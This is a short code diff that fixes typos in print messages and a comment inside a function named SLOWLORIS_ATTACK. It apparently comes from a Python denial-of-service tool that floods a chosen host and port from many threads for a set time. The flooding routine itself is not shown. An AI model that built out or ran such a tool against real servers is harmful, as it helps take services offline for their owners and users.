@@ -13,7 +13,7 @@ def SLOWLORIS_ATTACK(threads, attack_time, target):
 	target_ip = target.split(":")[0]
 	target_port = int(target.split(":")[1])
 
-	print("[#] Attack started for " + str(attack_time) + " secounds..")
+	print("[#] Attack started for " + str(attack_time) + " seconds..")
 	
 	threads_list = []
 
@@ -41,11 +41,11 @@ def SLOWLORIS_ATTACK(threads, attack_time, target):
 
 	# Start threads
 	for thread in range(0, threads):
-		print("[#] Staring thread " + str(thread))
+		print("[#] Starting thread " + str(thread))
 		t = Thread(target = slowloris_flood)
 		t.start()
 		threads_list.append(t)
-	# Sleep selected secounds
+	# Sleep selected seconds
 	time.sleep(attack_time)
 	# Terminate threads
 	for thread in threads_list:
